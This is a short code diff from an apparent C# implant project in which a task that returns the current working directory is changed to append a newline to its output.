@@ -10,7 +10,7 @@ namespace Implant.Tasks.Execute
 
         public override string Execute(ImplantTask task)
         {
-            return Directory.GetCurrentDirectory();
+            return $"{Directory.GetCurrentDirectory()}\n";
         }
     }
 }
